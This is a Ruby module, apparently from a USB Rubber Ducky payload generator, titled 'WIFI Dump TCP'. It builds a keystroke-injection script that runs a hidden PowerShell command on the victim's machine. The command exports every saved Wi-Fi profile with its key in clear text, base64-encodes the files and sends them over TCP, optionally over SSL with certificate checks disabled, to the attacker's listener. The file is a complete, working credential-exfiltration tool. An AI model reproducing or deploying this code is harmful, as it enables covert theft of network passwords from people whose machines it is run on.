#!/usr/bin/env ruby
require 'skeleton'
class WIFIDump < Skeleton
  attr_reader :ducky
  self.title = 'WIFI Dump TCP'
  self.description = 'Dump WIFI profiles, and send it over TCP'

  def setup
    @host = @server_setup.host
    @port = @server_setup.port
    @ssl = @server_setup.use_ssl?
  end

  def run
    return unless @server_setup.host_listener?
    server = Server::Start.new(@ssl, @host, @port)
    Thread.new { server.listener('wifi') }
  end

  def finish
    @priv_choice = @ducky_writer.menu
    File.open("#{text_path}#{@file_name}.txt", 'w') do |f|
      f.write(@ducky_writer.write(@priv_choice))
      f.write(psh_command)
    end
    Ducky::Compile.new("#{@file_name}.txt")
  end

  def temp_path(folder)
    %($env:TEMP+"\\#{folder}")
  end

  def psh_command
    random_folder = random_name_gen
    psh = 'powershell -nop -wind hidden -noni '
    psh << "$savedir=#{temp_path(random_folder)};mkdir $savedir;"
    if @priv_choice == '1' || @priv_choice == '2'
      psh << 'netsh wlan export profile folder=$savedir key=clear;$files=dir '
    else
      psh << 'netsh wlan export profile folder=$savedir;$files=dir '
    end
    psh << '$savedir;foreach($file in $files){$xml=[System.Convert]::'
    psh << 'ToBase64String([io.file]::ReadAllBytes($file.FullName);$socket = '
    psh << "New-Object net.sockets.tcpclient('#{@host}',#{@port});"
    if @ssl
      psh << '$stream = $socket.GetStream();$sslStream = New-Object '
      psh << 'System.Net.Security.SslStream($stream,$false,({$True} -as '
      psh << '[Net.Security.RemoteCertificateValidationCallback]));$writer = '
      psh << 'new-object System.IO.StreamWriter($stream);'
      psh << "$sslStream.AuthenticateAsClient('#{@host}');$writer = new-object "
      psh << 'System.IO.StreamWriter($sslStream);$writer.WriteLine($file);'
      psh << '$writer.flush();$writer.WriteLine($xml);$writer.flush();'
      psh << '$socket.close()}'
    else
      psh << '$stream = $socket.GetStream();$writer = new-object '
      psh << 'System.IO.StreamWriter($stream);$writer.WriteLine($file);'
      psh << '$writer.flush();$writer.WriteLine($xml);$writer.flush();'
      psh << '$socket.close()}'
    end
    psh
  end
end
